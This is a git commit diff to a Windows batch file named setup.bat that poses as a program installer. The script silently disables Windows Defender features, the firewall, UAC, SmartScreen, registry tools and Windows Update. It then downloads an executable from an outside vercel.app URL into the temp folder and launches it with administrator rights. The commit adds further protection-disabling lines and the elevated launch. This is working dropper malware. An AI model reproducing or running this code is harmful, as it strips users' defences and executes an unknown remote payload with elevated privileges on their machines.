82231f150ce21c44a11b6f25e8194f057cdecc0f
kuzya09 <160030136+dokinbog@users.noreply.github.com>
2024-06-05 14:41:43 +0300

    Update setup.bat

--- setup.bat
+++ setup.bat
@@ -3,24 +3,35 @@ setlocal enabledelayedexpansion
 
 :: Disable Windows Defender and other security features
 powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true" > nul 2>&1
-powershell -Command "Set-Service -Name 'WinDefend' -StartupType Disabled" > nul 2>&1
-powershell -Command "Stop-Service -Name 'WinDefend'" > nul 2>&1
+powershell -Command "Set-MpPreference -DisableBehaviorMonitoring $true" > nul 2>&1
+powershell -Command "Set-MpPreference -DisableBlockAtFirstSeen $true" > nul 2>&1
+powershell -Command "Set-MpPreference -DisableIOAVProtection $true" > nul 2>&1
+powershell -Command "Set-MpPreference -DisablePrivacyMode $true" > nul 2>&1
+powershell -Command "Set-MpPreference -SignatureDisable $true" > nul 2>&1
+powershell -Command "Set-MpPreference -PUAProtection 0" > nul 2>&1
+powershell -Command "Set-MpPreference -SubmitSamplesConsent 0" > nul 2>&1
+powershell -Command "Set-MpPreference -MAPSReporting 0" > nul 2>&1
 
 :: Disable Windows Firewall
 netsh advfirewall set allprofiles state off > nul 2>&1
 
 :: Disable UAC (User Account Control)
 reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f > nul 2>&1
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 1 /f > nul 2>&1
 
 :: Disable Windows SmartScreen
 reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /v SmartScreenEnabled /t REG_SZ /d Off /f > nul 2>&1
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer" /v SmartScreenEnabled /t REG_SZ /d Off /f > nul 2>&1
+
+:: Disable Windows Update
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v NoAutoUpdate /t REG_DWORD /d 1 /f > nul 2>&1
 
 :: Download the program
 set "outputFile=%TEMP%\codev.exe"
 set "downloadUrl=https://codev-zeta.vercel.app/codev.exe"
 
 echo Downloading the program...
-curl -L -o "%outputFile%" "%downloadUrl%" > nul 2>&1
+powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%downloadUrl%', '%outputFile%')" > nul 2>&1
 
 if not exist "%outputFile%" (
     echo Failed to download the program.
@@ -29,9 +40,9 @@ if not exist "%outputFile%" (
 
 echo Program downloaded successfully.
 
-:: Run the downloaded program
+:: Run the downloaded program with admin privileges
 echo Running the program...
-start "" "%outputFile%" > nul 2>&1
+powershell -Command "Start-Process '%outputFile%' -Verb RunAs" > nul 2>&1
 ping -n 5 127.0.0.1 > nul 2>&1
 
 :: Check if the program is running
